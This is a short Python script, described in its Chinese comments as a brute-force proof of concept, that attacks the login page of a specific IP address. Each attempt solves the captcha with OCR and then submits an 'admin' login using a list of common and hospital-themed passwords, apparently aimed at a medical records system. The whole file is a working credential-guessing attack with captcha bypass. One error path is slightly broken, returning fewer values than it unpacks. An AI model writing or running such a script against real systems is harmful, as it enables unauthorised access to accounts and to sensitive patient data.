#!/usr/bin/env python3
"""3400 端到端爆破 POC: 下载 captcha → OCR → 提交 login"""
import io
import json
import time
import requests
import ddddocr
from PIL import Image
from io import BytesIO

BASE = 'http://35.234.50.28:3400'
USER = 'admin'
PASSWORD_LIST = ['admin', 'admin123', 'admin@123', 'Admin123', 'admin1234', 
                 'password', 'Password1', 'Passw0rd', 'p@ssw0rd', '12345678',
                 'hospital', 'hospital123', 'EPCR2023', 'epcradmin', 'tpf123456']

ocr = ddddocr.DdddOcr(show_ad=False)

def login_attempt(password):
    """下载 captcha → OCR → 提交 login"""
    sess = requests.Session()
    # 1. 下载 captcha
    r = sess.get(f'{BASE}/captcha', timeout=5)
    if r.status_code != 200:
        return None, 'captcha-download-failed'
    # 2. OCR
    img = Image.open(BytesIO(r.content)).convert('RGB')
    buf = BytesIO()
    img.save(buf, format='PNG')
    captcha_text = ocr.classification(buf.getvalue())
    # 3. login
    r2 = sess.post(f'{BASE}/login', 
                   json={'username': USER, 'password': password, 'captcha': captcha_text, 'domain': 'AUTH_SERVER'},
                   timeout=5)
    return r2.status_code, r2.text[:200], captcha_text

print(f"{'Password':<20} {'Captcha':<8} {'Code':<6} {'Response'}")
print("-" * 100)
for pw in PASSWORD_LIST:
    try:
        code, text, cap = login_attempt(pw)
        if code is None:
            print(f"{pw:<20} {cap:<8} ERR   {text}")
        else:
            print(f"{pw:<20} {cap:<8} {code:<6} {text[:80]}")
    except Exception as e:
        print(f"{pw:<20} -       EXC   {str(e)[:80]}")
    time.sleep(0.5)
